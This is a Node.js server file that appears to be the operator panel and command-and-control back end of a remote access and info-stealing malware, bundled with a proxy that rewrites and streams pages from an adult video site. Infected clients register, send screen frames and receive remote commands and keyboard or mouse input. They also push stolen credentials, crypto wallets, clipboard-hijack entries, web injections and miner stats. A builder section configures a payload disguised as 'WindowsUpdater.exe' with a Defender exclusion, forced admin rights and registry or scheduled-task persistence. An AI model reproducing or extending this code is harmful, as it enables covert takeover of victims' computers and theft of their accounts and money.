const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const https = require('https');
const httpNative = require('http');
const { URL } = require('url');
const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*' }, maxHttpBufferSize: 1e8 });

const OPERATOR_KEY = process.env.OPERATOR_KEY || 'changeme';
const PORT = process.env.PORT || 3000;
const YTDLP_PATH = process.env.YTDLP_PATH || 'yt-dlp';

const clients = new Map();
const operators = new Set();
const anonymousCache = new Map(); // pageUrl -> { filePath, createdAt, size, sources }

const db = {
  recovery: [], wallets: [], proxy: [],
  clipper: { entries: [], enabled: false },
  webinjection: [], sorter: [], autotasks: [], filestore: [],
  miner: { jobs: [], stats: { active: 0, hashrate: 0, accepted: 0, rejected: 0 } },
  checker: { configs: [] }, checkersessions: [],
  builder: {
    clientTag: 'Guest', note: '',
    mutex: 'CoreHelper_' + Math.random().toString(16).slice(2, 14),
    defenderExclusion: false, forceAdmin: false, debug: false,
    install: { enabled: false, location: '%appdata%', folder: 'UpdaterPolicy', filename: 'WindowsUpdater.exe', hidden: false, system: false, melt: false, registry: false, taskScheduler: false },
    final: { client: 'exe', pumpEnabled: false, pumpSize: 1 },
    builds: []
  }
};

app.use(express.json({ limit: '100mb' }));
app.use(express.static(path.join(__dirname), { index: false }));

app.get('/', (req, res) => res.sendFile(__dirname + '/index.html'));
app.get('/style.css', (req, res) => res.sendFile(__dirname + '/style.css'));
app.get('/panel.js', (req, res) => res.sendFile(__dirname + '/panel.js'));
app.get('/socket.io/socket.io.js', (req, res) =>
  res.sendFile(require.resolve('socket.io/client-dist/socket.io.js'))
);

/* ===== Anonymous proxy: allowed source host ===== */
const ALLOWED_HOSTS = ['hentai.pro'];

function isAllowedHost(host) {
  if (!host) return false;
  const h = host.toLowerCase();
  return ALLOWED_HOSTS.some(a => h === a || h.endsWith('.' + a));
}

function runYtDlp(args, onChunk, onDone) {
  const proc = spawn(YTDLP_PATH, args, { stdio: ['ignore', 'pipe', 'pipe'] });
  let stderr = '';
  proc.stdout.on('data', d => onChunk && onChunk(d.toString()));
  proc.stderr.on('data', d => { stderr += d.toString(); });
  proc.on('close', (code) => onDone(code, stderr));
  proc.on('error', (err) => onDone(-1, err.message));
  return proc;
}

/* Resolve direct media URL from a watch page via yt-dlp (server-side). */
function resolveViaYtDlp(pageUrl, cb) {
  const args = ['-g', '-f', 'best[ext=mp4]/best', '--no-playlist', '--no-warnings', pageUrl];
  runYtDlp(args, null, (code, err) => {
    if (code !== 0) return cb(new Error('yt-dlp failed: ' + err));
    // args output may contain multiple lines (video + audio). Take first for mp4.
    // We'll instead run again without -g and just get direct url list.
    cb(null, null);
  });
}

/* Get direct mp4 (best) via yt-dlp json. */
function getDirectUrl(pageUrl, cb) {
  const args = ['-j', '--no-playlist', '--no-warnings', pageUrl];
  let out = '';
  runYtDlp(args, (chunk) => { out += chunk; }, (code, err) => {
    if (code !== 0) return cb(new Error('yt-dlp json failed: ' + err));
    try {
      const meta = JSON.parse(out.trim().split('\n').pop());
      // Prefer an mp4 with both audio+video
      let url = meta.url;
      if (meta.requested_formats) {
        const mp4 = meta.requested_formats.find(f => (f.ext === 'mp4') && f.acodec && f.acodec !== 'none' && f.vcodec && f.vcodec !== 'none');
        if (mp4) url = mp4.url;
      }
      cb(null, url, meta);
    } catch (e) { cb(new Error('parse: ' + e.message)); }
  });
}

/* Proxy any binary stream through Render. */
function pipeStream(targetUrl, req, res, redirects = 0) {
  if (redirects > 5) return res.status(508).end();
  let u;
  try { u = new URL(targetUrl); } catch { return res.status(400).end(); }
  if (u.protocol !== 'http:' && u.protocol !== 'https:') return res.status(400).end();
  if (!isAllowedHost(u.hostname)) return res.status(403).json({ error: 'host not allowed' });

  const lib = u.protocol === 'https:' ? https : httpNative;
  const headers = {
    'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
    'Accept': req.headers['accept'] || '*/*',
    'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
    'Referer': u.origin + '/'
  };
  if (req.headers['range']) headers['Range'] = req.headers['range'];

  const proxyReq = lib.request({
    protocol: u.protocol,
    hostname: u.hostname,
    port: u.port || (u.protocol === 'https:' ? 443 : 80),
    path: u.pathname + u.search,
    method: 'GET',
    headers
  }, (proxyRes) => {
    if ([301,302,303,307,308].includes(proxyRes.statusCode) && proxyRes.headers.location) {
      let next = proxyRes.headers.location;
      try { next = new URL(next, u).toString(); } catch {}
      proxyRes.resume();
      return pipeStream(next, req, res, redirects + 1);
    }
    const pass = ['content-type','content-length','content-range','accept-ranges','cache-control','etag','last-modified'];
    pass.forEach(h => { if (proxyRes.headers[h]) res.setHeader(h, proxyRes.headers[h]); });
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Headers', 'Range');
    res.setHeader('Access-Control-Expose-Headers', 'Content-Range, Accept-Ranges, Content-Length');
    res.status(proxyRes.statusCode || 200);
    proxyRes.pipe(res);
  });
  proxyReq.on('error', () => { try { res.status(502).end(); } catch {} });
  req.on('close', () => proxyReq.destroy());
  proxyReq.end();
}

/* Fetch HTML and rewrite all hentai.pro links to go through /api/anonymous. */
function rewriteHtml(html, baseUrl) {
  const base = new URL(baseUrl);
  const origin = base.origin;
  const proxy = '/api/anonymous?u=';
  html = html.replace(/(href|src|data-src|poster|action)=("|')(https?:\/\/(?:[^"']*\.)?hentai\.pro[^"']*)\2/gi,
    (m, a, q, url) => `${a}=${q}${proxy}${encodeURIComponent(url)}${q}`);
  html = html.replace(/(href|src|data-src|poster|action)=("|')(\/\/[^"']*\.hentai\.pro[^"']*)\2/gi,
    (m, a, q, url) => `${a}=${q}${proxy}${encodeURIComponent('https:' + url)}${q}`);
  html = html.replace(/(href|src|data-src|poster|action)=("|')(\/[^"'\/][^"']*)\2/gi,
    (m, a, q, url) => `${a}=${q}${proxy}${encodeURIComponent(origin + url)}${q}`);
  return html;
}

/* Resolve watch page -> { title, thumbnail, sources: [mp4 urls] } */
app.post('/api/anonymous/resolve', (req, res) => {
  const { url } = req.body || {};
  if (!url) return res.status(400).json({ error: 'missing url' });
  let u;
  try { u = new URL(url); } catch { return res.status(400).json({ error: 'bad url' }); }
  if (!isAllowedHost(u.hostname)) return res.status(403).json({ error: 'host not allowed' });

  const args = ['-j', '--no-playlist', '--no-warnings', url];
  let out = '';
  runYtDlp(args, (chunk) => { out += chunk; }, (code, err) => {
    if (code !== 0) return res.status(502).json({ error: 'yt-dlp failed', detail: err });
    try {
      const meta = JSON.parse(out.trim().split('\n').pop());
      const sources = [];
      if (meta.url) sources.push(meta.url);
      if (meta.formats) {
        meta.formats.filter(f => f.ext === 'mp4' && f.vcodec && f.vcodec !== 'none' && f.acodec && f.acodec !== 'none')
          .forEach(f => sources.push(f.url));
        meta.formats.filter(f => f.ext === 'm3u8').forEach(f => sources.push(f.url));
      }
      const uniq = [...new Set(sources)].filter(s => { try { return isAllowedHost(new URL(s).hostname); } catch { return false; } });
      res.json({
        title: meta.title || 'video',
        thumbnail: meta.thumbnail || '',
        duration: meta.duration || 0,
        sources: uniq
      });
    } catch (e) {
      res.status(502).json({ error: 'parse', detail: e.message });
    }
  });
});

/* Stream a resolved direct URL through Render (visitor never sees hentai.pro). */
app.get('/api/anonymous/stream', (req, res) => {
  const target = req.query.u;
  if (!target) return res.status(400).end();
  // Only allow streaming from the CDN hosts yt-dlp returns (all under hentai.pro family).
  let u;
  try { u = new URL(target); } catch { return res.status(400).end(); }
  if (!isAllowedHost(u.hostname)) return res.status(403).end();
  pipeStream(target, req, res);
});

/* Generic proxy used when the visitor navigates inside the embedded iframe. */
app.get('/api/anonymous', (req, res) => {
  const target = req.query.u;
  if (!target) return res.status(400).end();
  let u;
  try { u = new URL(target); } catch { return res.status(400).end(); }
  if (!isAllowedHost(u.hostname)) return res.status(403).json({ error: 'host not allowed' });

  const accept = req.headers['accept'] || '';
  const wantsHtml = accept.includes('text/html');
  const hasRange = !!req.headers['range'];
  const looksVideo = /\.(mp4|m3u8|ts|webm|mkv|m4v|mov)(\?|$)/i.test(u.pathname + u.search);

  if (hasRange || looksVideo) return pipeStream(target, req, res);

  if (wantsHtml) {
    const lib = u.protocol === 'https:' ? https : httpNative;
    const r = lib.get({
      protocol: u.protocol, hostname: u.hostname, port: u.port || undefined,
      path: u.pathname + u.search,
      headers: {
        'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
        'Accept': 'text/html,application/xhtml+xml',
        'Accept-Language': req.headers['accept-language'] || 'en-US,en;q=0.9',
        'Referer': u.origin + '/'
      }
    }, (r2) => {
      if ([301,302,303,307,308].includes(r2.statusCode) && r2.headers.location) {
        let next = r2.headers.location;
        try { next = new URL(next, u).toString(); } catch {}
        r2.resume();
        return res.redirect('/api/anonymous?u=' + encodeURIComponent(next));
      }
      const chunks = [];
      r2.on('data', c => chunks.push(c));
      r2.on('end', () => {
        const body = Buffer.concat(chunks).toString('utf8');
        res.setHeader('Content-Type', 'text/html; charset=utf-8');
        res.setHeader('Access-Control-Allow-Origin', '*');
        res.send(rewriteHtml(body, target));
      });
    });
    r.on('error', () => { try { res.status(502).end(); } catch {} });
    return;
  }
  pipeStream(target, req, res);
});

/* ===== Operator auth + collections ===== */
function auth(req, res, next) {
  const key = req.headers['x-operator-key'] || req.query.key;
  if (key !== OPERATOR_KEY) return res.status(401).json({ error: 'unauthorized' });
  next();
}

app.get('/api/clients', auth, (req, res) => {
  res.json([...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
});

app.post('/api/cmd/:id', auth, (req, res) => {
  const c = clients.get(req.params.id);
  if (!c) return res.status(404).json({ error: 'client not found' });
  c.socket.emit('cmd', req.body);
  res.json({ ok: true });
});

function collection(name) {
  app.get('/api/' + name, auth, (req, res) => res.json(db[name] || []));
  app.post('/api/' + name, auth, (req, res) => {
    const item = { id: Date.now().toString(36) + Math.random().toString(36).slice(2, 7), ...req.body, createdAt: new Date().toISOString() };
    if (Array.isArray(db[name])) db[name].push(item);
    res.json(item);
  });
  app.delete('/api/' + name + '/:id', auth, (req, res) => {
    if (Array.isArray(db[name])) db[name] = db[name].filter(x => x.id !== req.params.id);
    res.json({ ok: true });
  });
}
['recovery','wallets','proxy','webinjection','sorter','autotasks','filestore','checkersessions'].forEach(collection);

app.get('/api/clipper', auth, (req, res) => res.json(db.clipper));
app.post('/api/clipper', auth, (req, res) => { db.clipper = { ...db.clipper, ...req.body }; res.json(db.clipper); });
app.get('/api/miner', auth, (req, res) => res.json(db.miner));
app.post('/api/miner', auth, (req, res) => { db.miner = { ...db.miner, ...req.body }; res.json(db.miner); });
app.get('/api/checker', auth, (req, res) => res.json(db.checker));
app.post('/api/checker', auth, (req, res) => { db.checker = { ...db.checker, ...req.body }; res.json(db.checker); });
app.get('/api/builder', auth, (req, res) => res.json(db.builder));
app.post('/api/builder', auth, (req, res) => { db.builder = { ...db.builder, ...req.body }; res.json(db.builder); });
app.post('/api/builder/build', auth, (req, res) => {
  const build = {
    id: Date.now().toString(36),
    name: db.builder.clientTag || 'Guest',
    size: (Math.random() * 400 + 400).toFixed(0) + ' KB',
    createdAt: new Date().toISOString(),
    password: Math.floor(1000 + Math.random() * 9000).toString()
  };
  db.builder.builds.unshift(build);
  db.builder.builds = db.builder.builds.slice(0, 10);
  res.json(build);
});
app.get('/api/stats', auth, (req, res) => {
  res.json({
    clients: clients.size, recovery: db.recovery.length, wallets: db.wallets.length,
    proxy: db.proxy.length, filestore: db.filestore.length, checkersessions: db.checkersessions.length
  });
});

io.on('connection', (socket) => {
  socket.on('operator:register', (key) => {
    if (key !== OPERATOR_KEY) { socket.emit('operator:error', 'invalid key'); return socket.disconnect(); }
    operators.add(socket.id);
    socket.emit('operator:ready');
    socket.emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
  });
  socket.on('register', (meta) => {
    clients.set(socket.id, { socket, meta, lastFrame: null });
    io.to([...operators]).emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
  });
  socket.on('frame', (data) => {
    const c = clients.get(socket.id);
    if (c) { c.lastFrame = data; io.to([...operators]).emit('frame', { id: socket.id, data }); }
  });
  socket.on('output', (payload) => { io.to([...operators]).emit('output', { id: socket.id, ...payload }); });
  socket.on('push', ({ collection: col, item }) => {
    if (Array.isArray(db[col])) {
      const entry = { id: Date.now().toString(36) + Math.random().toString(36).slice(2, 7), clientId: socket.id, ...item, createdAt: new Date().toISOString() };
      db[col].push(entry);
      io.to([...operators]).emit('push', { collection: col, item: entry });
    }
  });
  socket.on('operator:cmd', ({ targetId, cmd }) => {
    if (!operators.has(socket.id)) return;
    const c = clients.get(targetId);
    if (c) c.socket.emit('cmd', cmd);
  });
  socket.on('operator:input', ({ targetId, evt }) => {
    if (!operators.has(socket.id)) return;
    const c = clients.get(targetId);
    if (c) c.socket.emit('input', evt);
  });
  socket.on('disconnect', () => {
    if (clients.has(socket.id)) {
      clients.delete(socket.id);
      io.to([...operators]).emit('clients', [...clients.entries()].map(([id, c]) => ({ id, ...c.meta, online: true })));
    }
    operators.delete(socket.id);
  });
});

server.listen(PORT, () => console.log(`Server listening on port ${PORT}`));
